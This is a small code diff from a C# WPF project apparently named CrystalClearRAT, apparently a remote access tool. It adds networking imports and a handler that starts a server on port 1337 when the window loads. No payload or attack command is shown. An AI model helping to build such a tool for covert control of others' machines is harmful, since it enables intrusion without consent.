@@ -1,6 +1,9 @@
-﻿using System;
+﻿using CrystalClearRAT.Web;
+using System;
 using System.Collections.Generic;
 using System.Linq;
+using System.Net;
+using System.Net.Sockets;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows;
@@ -24,5 +27,12 @@ namespace CrystalClearRAT
         {
             InitializeComponent();
         }
+
+        private void Grid_Loaded(object sender, RoutedEventArgs e)
+        {
+            Server.Start(1337);
+        }
+
+
     }
 }
